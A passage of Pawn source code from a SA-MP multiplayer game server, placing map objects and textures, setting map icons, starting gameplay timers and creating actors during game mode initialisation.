	Textura0[38]= CreateObject(18766, 1599.72327, -1263.42871, 23.41030,   -90.00000, 0.00000, 90.00000, 300.00);
	Textura0[39]= CreateObject(18762, 1598.27173, -1268.89050, 23.40910,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[40]= CreateObject(18762, 1599.71411, -1268.89575, 23.40910,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[41]= CreateObject(18762, 1555.43860, -1270.59644, 26.02170,   0.00000, 90.00000, 135.00000, 300.00);
	Textura0[42]= CreateObject(18762, 1556.70923, -1271.85596, 26.02100,   0.00000, 90.00000, 135.00000, 300.00);
	Textura0[43]= CreateObject(18980, 1570.62708, -1273.48096, 26.02520,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[44]= CreateObject(18980, 1578.81067, -1273.50024, 26.02520,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[45]= CreateObject(18762, 1592.69836, -1271.88855, 26.02050,   0.00000, 90.00000, 45.00000, 300.00);
	Textura0[46]= CreateObject(18762, 1593.97961, -1270.58667, 26.02050,   0.00000, 90.00000, 45.00000, 300.00);
	Textura0[47]= CreateObject(18981, 1564.14209, -1256.66504, 23.40020,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[48]= CreateObject(18981, 1586.29956, -1256.66589, 23.40020,   0.00000, 90.00000, 0.00000, 300.00);
	CreateObject(19375, 1585.61792, -1269.11450, 23.77130,   0.00000, 90.00000, 0.00000, 300.00);
	CreateObject(19375, 1575.13086, -1268.70947, 23.77130,   0.00000, 90.00000, 0.00000, 300.00);
	CreateObject(19375, 1564.61157, -1268.94824, 23.77130,   0.00000, 90.00000, 0.00000, 300.00);
	CreateObject(19375, 1559.43054, -1266.06995, 23.77100,   0.00000, 90.00000, 45.00000, 300.00);
	CreateObject(19375, 1590.79016, -1266.88684, 23.77100,   0.00000, 90.00000, 33.43670, 300.00);
	Textura0[49]= CreateObject(18762, 1549.92236, -1268.90320, 16.24640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[50]= CreateObject(18762, 1550.79529, -1268.88696, 16.24950,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[51]= CreateObject(18762, 1555.29834, -1270.73462, 16.26310,   0.00000, 90.00000, 135.00000, 300.00);
	Textura0[52]= CreateObject(18762, 1556.68579, -1272.10742, 16.27420,   0.00000, 90.00000, 135.00000, 300.00);
	Textura3[0]= CreateObject(19435, 1555.15588, -1269.79480, 20.17910,   0.00000, 90.00000, 135.00000, 300.00);
	Textura3[1]= CreateObject(19435, 1557.52686, -1272.18884, 20.17910,   0.00000, 90.00000, 135.00000, 300.00);
	Textura3[2]= CreateObject(19435, 1559.93115, -1273.17834, 20.16640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura3[3]= CreateObject(19435, 1563.35876, -1273.18958, 20.16640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura3[4]= CreateObject(19435, 1566.77930, -1273.20715, 20.16640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura3[5]= CreateObject(19435, 1570.25696, -1273.20996, 20.16640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura3[6]= CreateObject(19435, 1573.71887, -1273.22400, 20.16640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura3[7]= CreateObject(19435, 1577.19019, -1273.18774, 20.16640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura3[8]= CreateObject(19435, 1580.66577, -1273.25012, 20.16640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura3[9]= CreateObject(19435, 1584.12463, -1273.26208, 20.16640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura3[10]= CreateObject(19435, 1587.52002, -1273.26563, 20.16640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura3[11]= CreateObject(19435, 1589.50012, -1273.28442, 20.16640,   0.00000, 90.00000, 0.00000, 300.00);
	Textura3[12]= CreateObject(19435, 1591.93359, -1272.29419, 20.16640,   0.00000, 90.00000, 45.00000, 300.00);
	Textura3[13]= CreateObject(19435, 1594.34900, -1269.89819, 20.16640,   0.00000, 90.00000, 45.00000, 300.00);
	new Porta= CreateObject(1566, 1571.89868, -1273.48047, 18.00320,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(Porta, 0,  19325, "lsmall_shops", "lsmall_window01", 0xFF696969);
	new Porta0= CreateObject(1566, 1573.46533, -1273.48755, 18.00320,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(Porta0, 0,  19325, "lsmall_shops", "lsmall_window01", 0xFF696969);
	new PDiv= CreateObject(19089, 1573.46545, -1273.56030, 19.51740,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(PDiv, 0,  19430, "all_walls", "cj_white_wall2", 0xFFFFFFFF);
	new PDiv1= CreateObject(19089, 1573.48596, -1273.56580, 19.51740,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(PDiv1, 0,  19430, "all_walls", "cj_white_wall2", 0xFFFFFFFF);
	new PortaS= CreateObject(2040, 1573.46777, -1273.54858, 19.53620,   0.00000, 90.00000, 270.00000, 300.00);
	SetObjectMaterial(PortaS, 0,1223, "dynsigns", "white64", 0xFF000000);
	new PortaSF= CreateObject(1854, 1573.46985, -1273.59375, 19.49920,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(PortaSF, 0,  2360, "shopping_acc", "white", 0xFFCC0000);
	new Porta1= CreateObject(1566, 1575.03467, -1273.4779, 18.00320,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(Porta1, 0,  19325, "lsmall_shops", "lsmall_window01", 0xFF696969);
	new Porta2= CreateObject(1566, 1576.37512, -1273.4811, 18.00320,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(Porta2, 0,  19325, "lsmall_shops", "lsmall_window01", 0xFF696969);
	new PDiv2= CreateObject(19089, 1576.36145, -1273.53809, 19.51740,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(PDiv2, 0,  19430, "all_walls", "cj_white_wall2", 0xFFFFFFFF);
	new PDiv3= CreateObject(19089, 1576.38147, -1273.55811, 19.51740,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(PDiv3, 0,  19430, "all_walls", "cj_white_wall2", 0xFFFFFFFF);
	new PortaS1= CreateObject(2040, 1576.36719, -1273.47595, 19.53620,   0.00000, 90.00000, 270.00000, 300.00);
	SetObjectMaterial(PortaS1, 0,1223, "dynsigns", "white64", 0xFF000000);
	new PortaSF1= CreateObject(1854, 1576.37073, -1273.53906, 19.49920,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(PortaSF1, 0,  2360, "shopping_acc", "white", 0xFFCC0000);
	CreateObject(2920, 1575.00439, -1273.51416, 12.45780,   0.00000, 0.00000, 90.00000, 300.00);
	CreateObject(2920, 1571.79651, -1273.51611, 12.45780,   0.00000, 0.00000, 90.00000, 300.00);
	CreateObject(2920, 1578.02063, -1273.51794, 12.45780,   0.00000, 0.00000, 90.00000, 300.00);
	CreateObject(19834, 1576.99524, -1273.52222, 19.59910,   0.00000, 0.00000, 0.00000, 300.00);
	CreateObject(19834, 1574.67273, -1273.52808, 19.59910,   0.00000, 0.00000, 0.00000, 300.00);
	CreateObject(19834, 1572.85010, -1273.53406, 19.59910,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[14]= CreateObject(19815, 1566.15125, -1273.94885, 22.74750,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[15]= CreateObject(19815, 1563.18250, -1273.94885, 22.74750,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[16]= CreateObject(19815, 1560.26758, -1273.94885, 22.74750,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[17]= CreateObject(19815, 1559.68811, -1273.94690, 22.74750,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[18]= CreateObject(19815, 1557.13135, -1272.90015, 22.74750,   0.00000, 0.00000, -45.00000, 300.00);
	Textura3[19]= CreateObject(19815, 1555.05273, -1270.81873, 22.74750,   0.00000, 0.00000, -45.00000, 300.00);
	Textura3[20]= CreateObject(19815, 1554.45618, -1270.19690, 22.74750,   0.00000, 0.00000, -45.00000, 300.00);
	Textura3[21]= CreateObject(19815, 1580.92395, -1273.94885, 22.74750,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[22]= CreateObject(19815, 1583.91077, -1273.94885, 22.74750,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[23]= CreateObject(19815, 1586.89575, -1273.94885, 22.74750,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[24]= CreateObject(19815, 1589.76245, -1273.94885, 22.74750,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[25]= CreateObject(19815, 1592.27673, -1272.94556, 22.74750,   0.00000, 0.00000, 45.00000, 300.00);
	Textura3[26]= CreateObject(19815, 1594.38306, -1270.82898, 22.74750,   0.00000, 0.00000, 45.00000, 300.00);
	Textura3[27]= CreateObject(19815, 1595.43994, -1269.75708, 22.74750,   0.00000, 0.00000, 45.00000, 300.00);
	Textura3[28]= CreateObject(19815, 1569.12573, -1273.93555, 22.74750,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[29]= CreateObject(19815, 1591.22119, -1272.52502, 22.74750,   0.00000, 0.00000, -90.00000, 300.00);
	Textura3[30]= CreateObject(2920, 1575.00439, -1273.51416, 12.45780,   0.00000, 0.00000, 90.00000, 300.00);
	Textura3[31]= CreateObject(2920, 1571.79651, -1273.51611, 12.45780,   0.00000, 0.00000, 90.00000, 300.00);
	Textura3[32]= CreateObject(2920, 1578.02063, -1273.51794, 12.45780,   0.00000, 0.00000, 90.00000, 300.00);
	Textura3[33]= CreateObject(19834, 1576.99524, -1273.52222, 19.59910,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[34]= CreateObject(19834, 1574.67273, -1273.52808, 19.59910,   0.00000, 0.00000, 0.00000, 300.00);
	Textura3[35]= CreateObject(19834, 1572.85010, -1273.53406, 19.59910,   0.00000, 0.00000, 0.00000, 300.00);
	for(new i = 0; i != 36; i++) SetObjectMaterial(Textura3[i],0,10765, "airportgnd_sfse", "white", 0xFFFFFFFF);
	Textura0[53]= CreateObject(18980, 1565.53674, -1273.11597, 7.61050,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[54]= CreateObject(18980, 1584.43408, -1273.28552, 7.61050,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[55]= CreateObject(18980, 1594.88464, -1269.13049, 7.64740,   0.00000, 0.00000, 135.00000, 300.00);
	Textura0[56]= CreateObject(18980, 1554.65955, -1269.10193, 7.61050,   0.00000, 0.00000, 45.00000, 300.00);
	Textura0[57]= CreateObject(18980, 1570.73645, -1272.52344, 26.02520,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[58]= CreateObject(18980, 1578.87708, -1272.58252, 26.02500,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[59]= CreateObject(18980, 1578.87708, -1272.58252, 25.10163,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[60]= CreateObject(18980, 1570.73645, -1272.52344, 25.00908,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[61]= CreateObject(18980, 1578.87708, -1272.58252, 24.38444,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[62]= CreateObject(18980, 1570.73645, -1272.52344, 24.29186,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[63]= CreateObject(18980, 1596.33936, -1268.90747, 14.01770,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[64]= CreateObject(18980, 1553.02234, -1269.06372, 14.00840,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[65]= CreateObject(18980, 1553.91284, -1269.05481, 7.59320,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[66]= CreateObject(18980, 1596.04382, -1268.84009, 7.66495,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[67]= CreateObject(18762, 1555.95032, -1270.99561, 20.31680,   0.00000, 90.00000, 135.00000, 300.00);
	Textura0[68]= CreateObject(18762, 1556.45349, -1271.49622, 20.29680,   0.00000, 90.00000, 135.00000, 300.00);
	Textura0[69]= CreateObject(18762, 1592.47253, -1271.58887, 20.22910,   0.00000, 90.00000, 45.00000, 300.00);
	Textura0[70]= CreateObject(18762, 1593.25842, -1270.75415, 20.24910,   0.00000, 90.00000, 45.00000, 300.00);
	Textura0[71]= CreateObject(18980, 1571.28003, -1273.12744, 20.17320,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[72]= CreateObject(18980, 1578.38159, -1273.19348, 20.17320,   0.00000, 90.00000, 0.00000, 300.00);
	for(new i = 0; i != 73; i++) SetObjectMaterial(Textura0[i],0,8555, "vgsdwntwn2", "excaliburwall02_128", 0xFF1C1C1C);
	Piso[0]= CreateObject(19381, 1563.25696, -1274.26648, 16.52720,   0.00000, 90.00000, 0.00000, 300.00);
	Piso[1]= CreateObject(19381, 1573.72546, -1274.30225, 16.52720,   0.00000, 90.00000, 0.00000, 300.00);
	Piso[2]= CreateObject(19381, 1584.22925, -1274.24487, 16.52720,   0.00000, 90.00000, 0.00000, 300.00);
	Piso[3]= CreateObject(19381, 1589.75781, -1271.95764, 16.52700,   0.00000, 90.00000, 45.00000, 300.00);
	Piso[4]= CreateObject(19381, 1596.76099, -1266.90344, 16.52730,   0.00000, 90.00000, 0.00000, 300.00);
	Piso[5]= CreateObject(19381, 1557.70227, -1271.92224, 16.52700,   0.00000, 90.00000, 135.00000, 300.00);
	Piso[6]= CreateObject(19381, 1552.6802, -1267.8143, 16.5074000,   0.00000, 90.00000, 0.00000, 300.00);
	for(new i = 0; i != 7; i++) SetObjectMaterial(Piso[i],0,6130, "mall_law", "mono3_sfe");
	CreateObject(19795, 1581.83252, -1243.66931, 18.12310,   0.00000, 0.00000, 270.00000, 300.00);
	CreateObject(19795, 1590.35327, -1243.67737, 18.12310,   0.00000, 0.00000, 270.00000, 300.00);
	
	/*QUESTEVENT
	QuestP[0] = CreatePickup(1240, 23, 1728.5636,-1788.9183,3.9844); //LS
	QuestP[1] = CreatePickup(1240, 23, 1115.5435,-2037.2319,78.2109);
	QuestP[2] = CreatePickup(1240, 23, 1020.8390,-1916.7148,12.6586);
	QuestP[3] = CreatePickup(1240, 23, 674.8215,-1874.0317,5.4609);
	QuestP[4] = CreatePickup(1240, 23, 568.1980,-1763.5367,5.8171);
	QuestP[5] = CreatePickup(1240, 23, 386.6157,-1749.4797,9.0647);
	QuestP[6] = CreatePickup(1240, 23, 353.4161,-2032.3364,7.8359);
	QuestP[7] = CreatePickup(1240, 23, 367.5906,-1555.7925,32.9371);
	QuestP[8] = CreatePickup(1240, 23, 315.4170,-1421.4706,23.6719);
	QuestP[9] = CreatePickup(1240, 23, 445.0802,-1353.7988,14.8263);
	QuestP[10] = CreatePickup(1240, 23, 726.6733,-1278.7864,13.6484);
	QuestP[11] = CreatePickup(1240, 23, 874.5269,-1017.3561,32.3800);
	QuestP[12] = CreatePickup(1240, 23, 811.1966,-1098.3439,25.9063);
	QuestP[13] = CreatePickup(1240, 23, 1143.7087,-853.2827,43.4288);
	QuestP[14] = CreatePickup(1240, 23, 1432.2605,-1095.6021,17.5816);
	QuestP[15] = CreatePickup(1240, 23, 1823.8629,-1025.6740,24.4069);
	QuestP[16] = CreatePickup(1240, 23, 2232.5867,-1154.5403,25.8906);
	QuestP[17] = CreatePickup(1240, 23, 2275.8140,-929.9103,28.0421);
	QuestP[18] = CreatePickup(1240, 23, 2591.8728,-1325.2335,39.0907);
	QuestP[19] = CreatePickup(1240, 23, 2467.2212,-1753.5592,13.5469);
	QuestP[20] = CreatePickup(1240, 23, 2763.8604,-1823.5750,11.8478);
	QuestP[21] = CreatePickup(1240, 23, 1803.9902,-2141.5591,13.5469);
	QuestP[22] = CreatePickup(1240, 23, 2086.2131,-2364.8008,18.4061);
	QuestP[23] = CreatePickup(1240, 23, 1831.6080,-2692.1672,13.5469);
	QuestP[24] = CreatePickup(1240, 23, 2230.6057,-2286.0576,14.3751);
	QuestP[25] = CreatePickup(1240, 23, 1600.8949,1060.8597,10.8203); //LV
	QuestP[26] = CreatePickup(1240, 23, 1675.0802,1436.4150,10.7779);
	QuestP[27] = CreatePickup(1240, 23, 1319.0743,1254.8890,14.2731);
	QuestP[28] = CreatePickup(1240, 23, 1863.7559,1426.3014,16.9223);
	QuestP[29] = CreatePickup(1240, 23, 2000.6570,1522.5079,17.0682);
	QuestP[30] = CreatePickup(1240, 23, 2284.3582,1711.8986,11.0469);
	QuestP[31] = CreatePickup(1240, 23, 2435.2141,1662.8995,15.6457);
	QuestP[32] = CreatePickup(1240, 23, 2529.8450,1516.3772,10.8150);
	QuestP[33] = CreatePickup(1240, 23, 2857.8503,1283.9421,11.3906);
	QuestP[34] = CreatePickup(1240, 23, 2929.6311,2102.1277,17.8955);
	QuestP[35] = CreatePickup(1240, 23, 2803.9001,2306.7454,10.8203);
	QuestP[36] = CreatePickup(1240, 23, 2576.2644,2334.8816,17.8145);
	QuestP[37] = CreatePickup(1240, 23, 2413.5190,2545.7854,10.8203);
	QuestP[38] = CreatePickup(1240, 23, 2163.2266,2472.7617,10.8203);
	QuestP[39] = CreatePickup(1240, 23, 1846.4901,2337.4331,10.9799);
	QuestP[40] = CreatePickup(1240, 23, 1642.7734,2340.2678,9.8685);
	QuestP[41] = CreatePickup(1240, 23, 2177.4160,1294.5276,10.8203);
	QuestP[42] = CreatePickup(1240, 23, 1952.6266,1342.8512,15.3672);
	QuestP[43] = CreatePickup(1240, 23, 1981.2355,1653.0946,12.2422);
	QuestP[44] = CreatePickup(1240, 23, 2007.6135,1152.7927,10.8203);
	QuestP[45] = CreatePickup(1240, 23, 1022.8823,1043.7617,11.0000);
	QuestP[46] = CreatePickup(1240, 23, 2609.5229,2848.7825,10.8203);
	QuestP[47] = CreatePickup(1240, 23, 1731.8245,2775.8269,11.3509);
	QuestP[48] = CreatePickup(1240, 23, 945.5764,2017.5770,11.3486);
	QuestP[49] = CreatePickup(1240, 23, 2242.8765,1131.8381,10.8203);*/
	
    // MAPICON
    CreateDynamicMapIcon(1574.8773,-1274.0566,17.6131,55,0,-1,-1,-1,750.0);	// BuyCar Los Santos
    CreateDynamicMapIcon(1614.92480, 1816.09631, 10.91310,22,0,-1,-1,-1,750.0);	// Hospital LV
	CreateDynamicMapIcon(1172.3258,-1323.4644,15.4033,22,0,-1,-1,-1,750.0);	// Hospital LS
    CreateDynamicMapIcon(1528.779,-1678.113,5.890625,30,0,-1,-1,-1,750.0); // Pd LS
    CreateDynamicMapIcon(2286.9417,2431.7651,10.8203,30,0,-1,-1,-1,750.0);	// Pd LV
	CreateDynamicMapIcon(627.6160,-571.7920,17.6242,30,0,-1,-1,-1,750.0);	// FBI
	CreateDynamicMapIcon(213.8154,1866.6807,13.1406,30,0,-1,-1,-1,750.0);	// NG
	CreateDynamicMapIcon(1510.3986,-1059.5723,25.0625,35,0,-1,-1,-1,750.0);	// Event Arena

	printf("%d - Objects.",CountDynamicObjects());
	printf("%d - Pickups.",CountDynamicPickups());

	//Timer
	if (realtime)
	{
		new tmphour,
			tmpminute,
			tmpsecond;
		gettime(tmphour, tmpminute, tmpsecond);
		FixHour(tmphour);
		tmphour = shifthour;
		new worldt = tmphour;
		SetWorldTimeEx(worldt);
	}
	findtimer = SetTimer("FindCheck", 1000, 1);
	unjailtimer = SetTimer("SetPlayerUnjail", 1000, 1);
	othtimer = SetTimer("OtherTimer", 1000, 1);
	zerosec = SetTimer("ZeroSec", 10, 1);
	flytimer = SetTimer("Fly", 100, 1);
	checkafktimer = SetTimer("CheckAFK", 1000, 1);
	cartimer = SetTimer("CarCheck", 30000, 1);
    idletimer = SetTimer("IdleKick", idletime, 1);
	spectatetimer = SetTimer("Spectator", 1000, 1);
	productiontimer = SetTimer("Production", 300000, 1); //5 mins (300000)
	checkgastimer = SetTimer("CheckGas", RunOutTime, 1);
    checkvehinfotimer = SetTimer("Checkvehinfo",1000, 1);
    pnstimer = SetTimer("SetPlayerPNS", 1000, 1);
    wantedicatimer = SetTimer("FiveSecondsTimer", 5000, 1);
    savedatatimer = SetTimer("SavePlayerData", 1000, 1);
    SetTimer("Hacks", 1000, true);
	SetTimer("SendMSG", 300000, 1);
	actorpolitistcorupt = CreateActor(301, 1902.4514,-2020.4919,13.5469,270.0250);
	SetActorVirtualWorld(actorpolitistcorupt, 0);
	ApplyActorAnimation(actorpolitistcorupt, "COP_AMBIENT", "Coplook_loop", 4.1, 0, 0, 0, 1, 0); 
	actorrw = CreateActor(189, 356.1505,-2061.9248,7.8661,212.2285);
	SetActorVirtualWorld(actorrw, 0);
	ApplyActorAnimation(actorrw, "COP_AMBIENT", "Coplook_loop", 4.1, 0, 0, 0, 1, 0);
	printf("OnGameModeInit Loaded");
	MAX_SNOW = 1+random(1);
	new tmphour,
		tmpminute,
		tmpsecond;
	gettime(tmphour, tmpminute, tmpsecond);
	SetWeather(2);
	// BISERICA
	//Craciun
	if(zapada == 1)
	{
		AddSnowObjects();
	}
	//
	CreateObject(8678, 1771.45862, -1762.35425, 13.08090,   0.00000, 0.00000, 0.00000);
	CreateObject(8675, 1779.73718, -1764.38245, 21.73350,   0.00000, 0.00000, 0.00000);
	CreateObject(8676, 1734.15674, -1745.95093, 17.48020,   0.00000, 0.00000, 0.00000);
	CreateObject(8679, 1771.71667, -1762.53430, 12.52865,   0.00000, 0.00000, 0.00000);
	CreateObject(748, 1736.90332, -1804.43726, 12.50048,   0.00000, 0.00000, 0.00000);
	CreateObject(1231, 1753.61060, -1744.82947, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(1231, 1770.06494, -1744.82947, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(1231, 1786.13391, -1744.82947, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(1231, 1801.78320, -1744.82947, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(1231, 1801.78320, -1779.45605, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(1231, 1786.13391, -1779.45605, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(1231, 1770.06494, -1779.45605, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(1231, 1753.61060, -1779.45605, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(1231, 1740.86206, -1779.44312, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(3520, 1754.40112, -1750.16907, 12.74521,   0.00000, 0.00000, 0.00000);
	CreateObject(3520, 1734.14575, -1749.80054, 12.74521,   0.00000, 0.00000, 0.00000);
	CreateObject(3520, 1734.82275, -1773.09424, 12.74521,   0.00000, 0.00000, 0.00000);
	CreateObject(3520, 1769.69873, -1779.30676, 12.74520,   0.00000, 0.00000, 90.00000);
	CreateObject(3520, 1753.38367, -1779.40698, 12.74520,   0.00000, 0.00000, 90.00000);
	CreateObject(3520, 1740.52808, -1779.35034, 12.74520,   0.00000, 0.00000, 90.00000);
	CreateObject(3520, 1786.02063, -1779.33801, 12.74520,   0.00000, 0.00000, 90.00000);
	CreateObject(3520, 1802.25012, -1779.28052, 12.74520,   0.00000, 0.00000, 90.00000);
	CreateObject(3520, 1801.38904, -1744.41821, 12.74520,   0.00000, 0.00000, 90.00000);
	CreateObject(3520, 1785.76135, -1744.55115, 12.74520,   0.00000, 0.00000, 90.00000);
	CreateObject(3520, 1769.53271, -1744.63745, 12.74520,   0.00000, 0.00000, 90.00000);
	CreateObject(3520, 1759.47168, -1744.63940, 12.74520,   0.00000, 0.00000, 90.00000);
	CreateObject(3520, 1776.94995, -1744.69104, 12.74520,   0.00000, 0.00000, 90.00000);
	CreateObject(1231, 1733.96265, -1751.79834, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(1231, 1734.55994, -1773.73926, 15.49280,   0.00000, 0.00000, 0.00000);
	CreateObject(669, 1735.22998, -1777.83667, 12.73670,   0.00000, 0.00000, 0.00000);
	CreateObject(700, 1808.18066, -1777.72998, 13.22610,   0.00000, 0.00000, 0.00000);
	CreateObject(669, 1807.72937, -1748.80200, 12.73670,   0.00000, 0.00000, 0.00000);
	CreateObject(3458, 1703.38000, -1761.02844, 14.11930,   0.00000, 0.00000, -90.00000);
	CreateObject(1280, 1715.92090, -1781.19995, 12.86000,   0.00000, 0.00000, -90.00000);
	CreateObject(1280, 1715.92090, -1782.00000, 12.86000,   0.00000, 0.00000, 90.00000);
	CreateObject(1280, 1715.92090, -1774.00000, 12.86000,   0.00000, 0.00000, 90.00000);
	CreateObject(1280, 1715.92090, -1766.00000, 12.86000,   0.00000, 0.00000, 90.00000);
	CreateObject(1280, 1715.92090, -1758.00000, 12.86000,   0.00000, 0.00000, 90.00000);
	CreateObject(1280, 1715.90857, -1750.01575, 12.86000,   0.00000, 0.00000, 90.00000);
	CreateObject(1280, 1715.92090, -1773.19995, 12.86000,   0.00000, 0.00000, -90.00000);
	CreateObject(1280, 1715.92090, -1765.19995, 12.86000,   0.00000, 0.00000, -90.00000);
	CreateObject(1280, 1715.94092, -1757.19958, 12.86000,   0.00000, 0.00000, -90.00000);
	CreateObject(1280, 1715.92090, -1749.19995, 12.86000,   0.00000, 0.00000, -90.00000);
	CreateObject(1280, 1720.00000, -1749.19995, 12.86000,   0.00000, 0.00000, -90.00000);
	CreateObject(1300, 1717.94019, -1749.66663, 12.87960,   0.00000, 0.00000, 0.00000);
	CreateObject(1280, 1720.00000, -1757.19995, 12.86000,   0.00000, 0.00000, -90.00000);
	CreateObject(1280, 1720.00000, -1765.19995, 12.86000,   0.00000, 0.00000, -90.00000);
	CreateObject(1280, 1720.00000, -1773.19995, 12.86000,   0.00000, 0.00000, -90.00000);
	CreateObject(1280, 1720.00000, -1781.19995, 12.86000,   0.00000, 0.00000, -90.00000);
	CreateObject(1280, 1720.00000, -1750.00000, 12.86000,   0.00000, 0.00000, 90.00000);
	CreateObject(1280, 1720.00000, -1758.00000, 12.86000,   0.00000, 0.00000, 90.00000);
	CreateObject(1280, 1720.00000, -1766.00000, 12.86000,   0.00000, 0.00000, 90.00000);
	CreateObject(1280, 1720.00000, -1774.00000, 12.86000,   0.00000, 0.00000, 90.00000);
	CreateObject(1280, 1720.00000, -1782.00000, 12.86000,   0.00000, 0.00000, 90.00000);
	CreateObject(1300, 1717.94019, -1757.57544, 12.87960,   0.00000, 0.00000, 0.00000);
	CreateObject(1300, 1717.94019, -1765.59338, 12.87960,   0.00000, 0.00000, 0.00000);
	CreateObject(1300, 1717.94019, -1773.57739, 12.87960,   0.00000, 0.00000, 0.00000);
	CreateObject(1300, 1717.94019, -1781.53674, 12.87960,   0.00000, 0.00000, 0.00000);
	CreateObject(1257, 1735.74158, -1809.34338, 13.81740,   0.00000, 0.00000, 75.00000);
	CreateObject(1341, 1745.20837, -1808.05530, 13.57740,   0.00000, 0.00000, 75.00000);
	CreateObject(1340, 1749.23767, -1808.73706, 13.67740,   0.00000, 0.00000, 75.00000);
	CreateObject(1342, 1753.96008, -1809.63196, 13.59740,   0.00000, 0.00000, 75.00000);
	CreateObject(1340, 1757.87146, -1811.02502, 13.61740,   0.00000, 0.00000, 75.00000);
	CreateObject(1775, 1752.36951, -1809.18958, 13.67670,   0.00000, 0.00000, 165.00000);
	CreateObject(6965, 1789.90088, -1799.61169, 16.15140,   0.00000, 0.00000, 0.00000);
	CreateObject(6964, 1789.99329, -1799.57837, 11.83070,   0.00000, 0.00000, 0.00000);
	CreateObject(1281, 1768.38708, -1785.51550, 13.32840,   0.00000, 0.00000, 0.00000);
	CreateObject(1281, 1759.57935, -1785.71826, 13.32840,   0.00000, 0.00000, 0.00000);
	CreateObject(1281, 1750.73303, -1785.65308, 13.32840,   0.00000, 0.00000, 0.00000);
	CreateObject(1281, 1742.49988, -1785.40930, 13.32840,   0.00000, 0.00000, 0.00000);
	CreateObject(1281, 1735.39075, -1785.28650, 13.32840,   0.00000, 0.00000, 0.00000);
	CreateObject(1281, 1733.97314, -1801.51868, 13.32840,   0.00000, 0.00000, -14.00000);
	CreateObject(1281, 1727.36646, -1799.86462, 13.32840,   0.00000, 0.00000, -14.00000);
	CreateObject(1281, 1720.64539, -1798.24097, 13.32840,   0.00000, 0.00000, 0.00000);
	CreateObject(1281, 1741.15491, -1803.53967, 13.32840,   0.00000, 0.00000, -14.00000);
	CreateObject(1281, 1705.11536, -1789.26038, 13.32840,   0.00000, 0.00000, 0.00000);
	CreateObject(4642, 1780.90588, -1815.70178, 14.22830,   0.00000, 0.00000, 0.00000);
	CreateObject(838, 1808.55994, -1818.22375, 15.24600,   0.00000, 0.00000, 0.00000);
	CreateObject(618, 1782.77820, -1817.87708, 12.85660,   0.00000, 0.00000, 0.00000);
	CreateObject(729, 1811.02710, -1804.72205, 12.57820,   0.00000, 0.00000, 0.00000);
	CreateObject(950, 1808.56494, -1805.02698, 13.12379,   0.00000, 0.00000, 0.00000);
	CreateObject(949, 1809.68567, -1805.03735, 13.17630,   0.00000, 0.00000, 0.00000);
	CreateObject(8990, 1811.25171, -1810.78662, 13.24750,   0.00000, 0.00000, 90.00000);
	CreateObject(8990, 1811.17700, -1789.78491, 13.24750,   0.00000, 0.00000, 90.00000);
	CreateObject(729, 1810.95129, -1795.97107, 12.57820,   0.00000, 0.00000, 0.00000);
	CreateObject(729, 1810.77856, -1787.97192, 12.57820,   0.00000, 0.00000, 0.00000);
	CreateObject(729, 1811.03687, -1813.20447, 12.57820,   0.00000, 0.00000, 0.00000);
	CreateObject(18014, 1808.72205, -1804.17175, 12.97270,   0.00000, 0.00000, 90.00000);
	CreateObject(1571, 1762.62598, -1811.67944, 13.62020,   0.00000, 0.00000, 165.00000);
